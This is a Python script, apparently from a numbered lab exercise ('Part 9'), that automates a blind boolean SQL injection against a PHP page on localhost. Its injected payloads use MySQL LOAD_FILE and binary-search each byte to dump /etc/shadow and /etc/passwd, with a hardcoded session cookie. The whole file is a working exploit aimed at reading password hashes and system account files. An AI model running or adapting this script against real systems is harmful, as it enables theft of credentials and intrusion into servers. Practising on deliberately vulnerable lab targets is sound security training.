import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

URL = "http://localhost:8000/blindsqli.php"
TRUE_INDICATOR = "In wonderland right now"

MY_COOKIES = {
    'PHPSESSID': '414170264f5da76958870da216138b7c'
}

# Session with automatic retries on connection errors
_session = requests.Session()
_adapter = HTTPAdapter(max_retries=Retry(total=5, backoff_factor=0.3,
                                         status_forcelist=[500, 502, 503, 504]))
_session.mount("http://", _adapter)


def _get(params: dict) -> requests.Response:
    # GET with retry + brief back-off on RemoteDisconnected.# 
    for attempt in range(5):
        try:
            return _session.get(URL, params=params, cookies=MY_COOKIES, timeout=10)
        except requests.exceptions.ConnectionError:
            if attempt == 4:
                raise
            time.sleep(0.5 * (attempt + 1))


def path_to_char(path: str) -> str:
    # Encode a file path as SQL CHAR(...) to avoid quote-escaping issues.# 
    return "CHAR(" + ",".join(str(ord(c)) for c in path) + ")"


def check_connection() -> bool:
    res = _get({'user': "alice' AND 1=1 #"})
    ok = TRUE_INDICATOR in res.text
    print("Sanity check:", "PASSED" if ok else "FAILED")
    return ok


def file_is_readable(path: str) -> bool:
    # Return True if LOAD_FILE returns a non-NULL result for the given path.
    path_char = path_to_char(path)
    payload = f"alice' AND LOAD_FILE({path_char}) IS NOT NULL #"
    res = _get({'user': payload})
    return TRUE_INDICATOR in res.text


def get_file_length(path_char: str) -> int:
    # Binary-search for the exact byte length of the file (0 = unreadable/empty).
    res = _get({'user': f"alice' AND LENGTH(LOAD_FILE({path_char}))>0 #"})
    if TRUE_INDICATOR not in res.text:
        return 0

    lo, hi = 1, 8192
    while lo < hi:
        mid = (lo + hi + 1) // 2
        res = _get({'user': f"alice' AND LENGTH(LOAD_FILE({path_char}))>={mid} #"})
        if TRUE_INDICATOR in res.text:
            lo = mid
        else:
            hi = mid - 1
    return lo


def read_byte_bsearch(path_char: str, pos: int) -> int:
    # Binary-search the byte value at position `pos` (1-based). 8 requests per byte.
    lo, hi = 0, 255
    while lo < hi:
        mid = (lo + hi) // 2
        # Is the byte value > mid?
        res = _get({'user': f"alice' AND ASCII(SUBSTRING(LOAD_FILE({path_char}),{pos},1))>{mid} #"})
        if TRUE_INDICATOR in res.text:
            lo = mid + 1
        else:
            hi = mid
    return lo


def read_file(path: str) -> bytes:
    # Read a file via blind boolean SQLi using binary search (8 req/byte).
    path_char = path_to_char(path)

    print(f"  Checking readability of {path!r} ... ", end='', flush=True)
    if not file_is_readable(path):
        print("NOT READABLE (NULL returned by LOAD_FILE)")
        return b""

    print("READABLE — measuring length...", end='', flush=True)
    length = get_file_length(path_char)
    print(f" {length} bytes")

    if length == 0:
        return b""

    data = []
    print("  Reading: ", end='', flush=True)
    for i in range(1, length + 1):
        byte_val = read_byte_bsearch(path_char, i)
        data.append(byte_val)
        ch = chr(byte_val) if 32 <= byte_val < 127 else f"\\x{byte_val:02x}"
        print(ch, end='', flush=True)
    print()
    return bytes(data)


def main():
    print("=" * 60)
    print("Part 9 – Attempting to read /etc/shadow via LOAD_FILE SQLi")
    print("=" * 60)

    if not check_connection():
        print("Cannot reach the server. Aborting.")
        return

    # the real target — /etc/shadow
    print("\nAttempting to read /etc/shadow")
    shadow_data = read_file("/etc/shadow")
    if shadow_data:
        print(f"\n  SUCCESS! /etc/shadow ({len(shadow_data)} bytes):")
        print(shadow_data.decode("latin-1", errors="replace"))
        print("\n  Hex dump:")
        print(shadow_data.hex())
    else:
        print("\n  FAILED: /etc/shadow returned NULL (unreadable).")

    # /etc/passwd (world readable)
    print("\n/etc/passwd (world-readable)")
    passwd_data = read_file("/etc/passwd")
    if passwd_data:
        print(f"\n  /etc/passwd ({len(passwd_data)} bytes):")
        print(passwd_data.decode("latin-1", errors="replace"))
    else:
        print("\n  FAILED: /etc/passwd is also unreadable.")


if __name__ == "__main__":
    main()
